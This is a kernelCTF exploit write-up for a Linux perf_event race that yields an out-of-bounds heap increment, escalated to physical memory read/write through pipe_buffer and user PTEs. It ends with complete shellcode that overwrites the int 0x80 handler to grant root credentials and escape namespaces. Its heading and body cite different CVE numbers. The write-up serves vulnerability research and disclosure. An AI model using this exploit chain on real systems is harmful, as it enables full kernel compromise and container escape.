# CVE-2023-6931

## Exploit Details

Exploit demo for CVE-2023-5717. Flag: `kernelCTF{v1:mitigation-v3b-6.1.55:1732857935:6261f8f865bfa74724bdfdf5002d01c644f70ff6}`

## Overview

This vulnerability enables an out-of-bounds increment when a race condition is successfully triggered.
On hardened systems, mitigations such as CONFIG_KMALLOC_SPLIT_VARSIZE increase exploitation complexity.
To circumvent these defenses, I manipulated the buddy allocator to achieve controlled linear heap allocation.

The diagram represents the hierarchy of perf_event groups when a process creates an event group and then forks a child process.
1) Parent group (Inital state)
- At the top, we have a group_leader, which is the leader of the parent event group.
- The group_leader manages multiple sibling events, which are linked together.
```
+-----------------+         +------------+
| group_leader    |---------| sibling 1  |  <--- Siblings connected to group_leader
+-----------------+         +------------+
```
2) Child group (After forking)
- When the process forks a child process, the event group is inherited by the child.
- This creates a child event group, which consists of new events mirroring the parent group's structure.
- The child event group also has a new group leader, which is the event corresponding to group_leader in the child process.
```
+-----------------+         +------------+
| group_leader    |---------| sibling 1  |  <--- Siblings connected to group_leader
+-----------------+         +------------+
    |                           |      
+-----------+             +-----------+
| child 1   |-------------| child 2   |  <--- Children connected to each parent & child group leader
+-----------+             +-----------+
```

Following diagram represents the overall structure.
```
+----------------+   +-------+   +---------+
| Parent Process |---| CTX A |---| Group A |
+----------------+   +-------+   +---------+
    |                                 
+---------------+   +--------+   +----------+
| Child Process |---| CTX A' |---| Group A' | <--- Inherited child group
+---------------+   +--------+   +----------+
```
Each CTX is responsible for controlling and managing its event group. For example, before accessing Group A, CTX A locks this group to prevent race conditions.

## Race scenario
### CPU0
```c
perf_read()
  ctx = perf_event_ctx_lock(event);
  - perf_read_group()
      values = kzalloc(event->read_size, GFP_KERNEL); // [A]
      mutex_lock(&leader->child_mutex);  // [B]
      ret = __perf_read_group_add(leader, read_format, values);
      list_for_each_entry(child, &leader->child_list, child_list) {
        ret = __perf_read_group_add(child, read_format, values);
      }
      mutex_unlock(&leader->child_mutex);      
  perf_event_ctx_unlock(event, ctx);
```
### CPU1
```c
perf_release()
  ctx = perf_event_ctx_lock(event);
  perf_remove_from_context(event, DETACH_GROUP|DETACH_DEAD); // [C]
  perf_event_ctx_unlock(event, ctx); // [D]
  mutex_lock(&event->child_mutex);  // [E]
  list_for_each_entry(child, &event->child_list, child_list) {
    perf_remove_from_context(child, DETACH_GROUP);
  }
```
### Description
If execution follows the sequence C -> D -> A -> B -> E, the vulnerability is triggered as follows:
1) At C, the parent event is removed from its parent group, decrementing `group_leader->nr_siblings`, which represents the parent group's size.
2) At A, `values` is allocated based on the value of `group_leader->nr_siblings`, which has now been reduced.
3) At B, CPU 0 locks child_mutex, preventing CPU 1 from proceeding beyond E.
4) At E, CPU 1 attempts to iterate through `event->child_list`, but it is blocked because CPU 0 holds the lock at B.
5) Since the parent group's `child_list` is smaller than the child group's `child_list`, this leads to an out-of-bounds access on the heap, causing heap out-of-bounds.

## Allocating Buffers via the Buddy Allocator
In `perf_read_group()`, the allocated buffer size is determined by the number of active events.
The `perf_event_open()` system call enforces a restriction that new events must belong to the same task as the group leader:
```c
SYSCALL_DEFINE5(perf_event_open,
		struct perf_event_attr __user *, attr_uptr,
		pid_t, pid, int, cpu, int, group_fd, unsigned long, flags)
{
    [...]
    if (pid != -1 && !(flags & PERF_FLAG_PID_CGROUP)) {
		task = find_lively_task_by_vpid(pid);
		if (IS_ERR(task)) {
			err = PTR_ERR(task);
			goto err_group_fd;
		}
	}
    [...]
    event = perf_event_alloc(&attr, cpu, task, group_leader, NULL,
				 NULL, NULL, cgroup_fd);
    [...]
    ctx = find_get_context(pmu, task, event);
	if (IS_ERR(ctx)) {
		err = PTR_ERR(ctx);
		goto err_alloc;
	}

	/*
	 * Look up the group leader (we will attach this event to it):
	 */
	if (group_leader) {
        [...]
        /*
		 * Make sure we're both on the same task, or both
		 * per-CPU events.
		 */
		if (group_leader->ctx->task != ctx->task)
			goto err_context;
        [...]
    }
    [...]
}
```
The check:
```c
if (group_leader->ctx->task != ctx->task)
    goto err_context
```
ensures that group_leader and the new event belong to the same task.

Once an event is created, a new file descriptor is assigned to it.
While the default limit for the number of open file descriptors is 1024, this becomes a constraint since my exploit involves the allocating a lot of events. Fortunately, I can adjust this limit slightly. 
A function named `setup_max_fd_limit()` in my exploit is reponsible for adjusting this limit.

## Gaining 8-byte Out-of-Bounds Arbitrary Increment primitive.
### Extending the race window
To extend the race window, I adapted some code from [CVE-2023-4622 Write-Up](https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-4622_lts/docs/exploit.md).

```c
void race(int group_leader) { // caller must have ownership of the event group
    [...]
    pid_t child_pid = fork();
    if (child_pid == 0) {  
        [...]
        for (int _=0; _<32; _++) {
            read(group_leader, event_buf, sizeof(event_buf));
        }
        [...]
    }
    else if (child_pid > 0) { // parent
        [...]
        struct itimerspec new = {.it_value.tv_nsec = r};
        timerfd_settime(tfd, TFD_TIMER_CANCEL_ON_SET, &new, NULL);
        close(siblings[100]);
        [...]
}
```

### Bypassing context swap optimization
An exploit for mitigation instance with over 70% reliability is eligible. 
At first I didn't care about context swap optimization, but the reliability of my exploit was about 10~20% and it took about 3~4hrs to run.
Since my exploit is for mitigation instance, it was not eligible.

The function `perf_event_context_sched_out()` is invoked by the task scheduler during context switches:
```c
static void perf_event_context_sched_out(struct task_struct *task, int ctxn,
                                         struct task_struct *next)
{
  [...]
		if (context_equiv(ctx, next_ctx)) {
      [...]
			WRITE_ONCE(ctx->task, next);
			WRITE_ONCE(next_ctx->task, task);
            [...]
			RCU_INIT_POINTER(task->perf_event_ctxp[ctxn], next_ctx);
			RCU_INIT_POINTER(next->perf_event_ctxp[ctxn], ctx);

			do_switch = 0;

			perf_event_sync_stat(ctx, next_ctx);
		}
  [...]
}
```
This function swaps ctx between two tasks under the following conditions:
```
- child task -> parent task 
- parent task -> child task 
- child task -> child task 
```
Crucially, both tasks must belong to the same group, and their group composition must be identical. 
Because the scheduler's behavior is almost impossible to predict, I needed to find a way to work around this limitation.
Specifically, this swap optimization can be circumvented through techniques like CPU core pinning to fix process execution locations, or by intentionally altering group compositions to make such optimizations impossible to implement effectively.
The following code demonstrates these implementation strategies:
```c
void race(int group_leader) { // caller must have ownership of the event group
    [...]
    else if (child_pid > 0) { // parent

        race_layout_index += 2;
        int tmp = perf_event_open(&pe, 0, CPU_A, -1, 0); 
        close(tmp);
        // this code seems useless but, this ensure that the process's ctx is no longer get swapped by scheduler.
        // it's very important because the ownership of the group can be destroyed while child process exits.
        // we have to keep the ownership away from being destroyed.
        usleep(20000);
        kill(child_pid, SIGCONT); // now we pinned the ownership. now child process is allowed to exit.
    [...]
    }
}
```

### Arbitrary increment
- Normally, a page fault increments a counter in the current process's ctx.
- However, after swapping(`perf_event_context_sched_out()`), the child's page fault increments counters in the parent's ctx.
- Pinning the parent and child to different CPUs prevents context reswaps, making the attack reliable.

```c
	pid_t child_pid = fork();
    if (child_pid == 0) {
        [...]
        page_fault_memory = (char *)mmap(NULL, 0x1000 * PAGE_FAULT_COUNT, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        for (int i=0; i < PAGE_FAULT_COUNT; i++) {
            ioctl(group_leader, PERF_EVENT_IOC_ENABLE, 0);
            page_fault_memory[0x1000 * i] = 0x41;
            ioctl(group_leader, PERF_EVENT_IOC_DISABLE, 0);
        }
        [...]
        remove_xattr(xattr_name, 1); // used for oob buffer
        for (int _=0; _<32; _++) {
            read(group_leader, event_buf, sizeof(event_buf)); 
        }
        write(vuln_pipe[1], &pte, sizeof(pte));  
        munmap(page_fault_memory, 0x1000 * 0x80);

        exit(0);
    }
    else if (child_pid > 0) {
        _pin_to_cpu(CPU_B);  // pinned to CPU_B
        sched_yield(); 
		[...]
	}
```

## Arbitrary physical address Read/Write
1) Spraying User PTEs Near pipe_buffer
- First, we allocate a pipe_buffer and then allocate user pages.
- By repeatedly accessing these user pages, we spray user page table entries (PTEs) close to the pipe_buffer in memory.

2) Triggering the Vulnerability to Increment `pipe_buffer->page`
- We trigger the vulnerability to increment `pipe_buffer->page`, effectively making it point to the user PTEs.
- If the race condition is successful, we gain control over user PTEs and modify them as needed.

3) Patching the int 0x80 Handler
- Once we gain arbitrary memory read/write, we search for the int 0x80 handler and overwrite it with following shellcode.
```c
    swapgs
    mov r12, QWORD PTR gs:0x20cc0
    mov r14, [r12+0x248] 
    sub r14, 0x1ec030   // r14 = kbase
    mov r8, r14 
     
    mov rdi, 1 
    mov rax, r8 
    add rax, 0x1bde50   

    push r12
    push r8
    call rax     // find_task_by_vpid(1)
    mov rbx, rax
    pop r8
    pop r12

    mov rax, r8 
    add rax, 0x2a76900
    mov rdi, rax
    mov [rbx+2104], rdi    // task_struct->ns_proxy = init_nsproxy
    mov [r12+2104], rdi    // task_struct->ns_proxy = init_nsproxy

    mov rax, r8 
    add rax, 0x2a76b40
    mov rdi, rax
    mov [r12 + 2008], rdi   // task_struct->cred = init_cred
    swapgs 
    iretq
```